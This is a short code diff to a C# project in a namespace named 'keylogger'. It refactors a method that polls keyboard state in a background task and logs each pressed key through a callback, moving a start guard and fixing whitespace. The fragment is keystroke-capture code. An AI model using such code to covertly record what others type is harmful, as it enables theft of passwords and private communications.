@@ -27,10 +27,11 @@ namespace keylogger
 
         public void KeyHook(Action<Key> LogKeys, Dispatcher dispatcher)
         {
-            if (Start)
-                return;
             Task.Run(() =>
             {
+                if (Start)
+                    return;
+
                 Start = true;
                 try
                 {
@@ -42,7 +43,7 @@ namespace keylogger
                             {
                                 if (Keyboard.IsKeyDown(key.Key) && key.Value == true)
                                 {
-                                    LogKeys(key.Key);                                    
+                                    LogKeys(key.Key);
                                     Keys[key.Key] = false;
                                 }
                                 if (Keyboard.IsKeyUp(key.Key))
